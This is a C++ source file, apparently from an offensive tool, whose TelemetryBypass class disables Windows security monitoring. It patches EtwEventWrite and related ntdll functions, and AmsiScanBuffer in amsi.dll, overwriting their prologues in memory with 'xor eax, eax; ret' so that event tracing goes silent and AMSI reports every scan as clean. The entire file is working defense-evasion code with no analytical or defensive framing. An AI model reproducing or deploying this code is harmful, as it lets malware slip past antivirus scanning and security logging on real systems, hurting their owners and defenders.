#include "../include/ETWAMSIBypass.h"
#include "../include/APIHashing.h"
#include <cstring>

// Patch a function in a DLL by address using VirtualProtect
BOOL TelemetryBypass::PatchFunction(const char *dllName, const char *functionName, BYTE *patch, SIZE_T patchSize)
{
    // Load the DLL
    HMODULE hDll = LoadLibraryA(dllName);
    if (!hDll)
        return FALSE;

    // Get function address
    LPVOID pFunction = (LPVOID)GetProcAddress(hDll, functionName);
    if (!pFunction)
    {
        FreeLibrary(hDll);
        return FALSE;
    }

    // Change memory protection to allow writing
    DWORD oldProtect;
    if (!VirtualProtect(pFunction, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        FreeLibrary(hDll);
        return FALSE;
    }

    // Write patch bytes to function prologue
    memcpy(pFunction, patch, patchSize);

    // Restore original protection
    VirtualProtect(pFunction, patchSize, oldProtect, &oldProtect);

    // Flush instruction cache
    FlushInstructionCache(GetCurrentProcess(), pFunction, patchSize);

    FreeLibrary(hDll);
    return TRUE;
}

// Overwrites prologue with "xor eax, eax; ret"
BOOL TelemetryBypass::PatchETWFunction(const char *functionName)
{
    // Patch bytes: xor eax, eax (2 bytes: 0x33 0xC0) + ret (1 byte: 0xC3)
    BYTE patch[] = {0x33, 0xC0, 0xC3}; // xor eax, eax; ret

    return PatchFunction("ntdll.dll", functionName, patch, sizeof(patch));
}

// Disable ETW by patching key functions
BOOL TelemetryBypass::DisableETW()
{
    BOOL result1 = PatchETWFunction("EtwEventWrite");
    BOOL result2 = PatchETWFunction("EtwEventWriteEx");
    BOOL result3 = PatchETWFunction("EtwEventWriteString");

    // At least one patch should succeed for ETW bypass
    return (result1 || result2 || result3);
}

BOOL TelemetryBypass::DisableAMSI()
{
    BYTE patchAMSI[] = {0x33, 0xC0, 0xC3}; // xor eax, eax; ret (returns AMSI_RESULT_CLEAN = 0)

    BOOL result = PatchFunction("amsi.dll", "AmsiScanBuffer", patchAMSI, sizeof(patchAMSI));

    // Also try patching in current process if amsi.dll not loaded
    if (!result)
    {
        HMODULE hAmsi = GetModuleHandleA("amsi.dll");
        if (hAmsi)
        {
            LPVOID pAmsiScan = (LPVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (pAmsiScan)
            {
                DWORD oldProtect;
                if (VirtualProtect(pAmsiScan, sizeof(patchAMSI), PAGE_EXECUTE_READWRITE, &oldProtect))
                {
                    memcpy(pAmsiScan, patchAMSI, sizeof(patchAMSI));
                    VirtualProtect(pAmsiScan, sizeof(patchAMSI), oldProtect, &oldProtect);
                    FlushInstructionCache(GetCurrentProcess(), pAmsiScan, sizeof(patchAMSI));
                    result = TRUE;
                }
            }
        }
    }

    return result;
}

// Disable both ETW and AMSI
BOOL TelemetryBypass::DisableTelemetry()
{
    BOOL etwDisabled = DisableETW();
    BOOL amsiDisabled = DisableAMSI();

    return (etwDisabled || amsiDisabled);
}
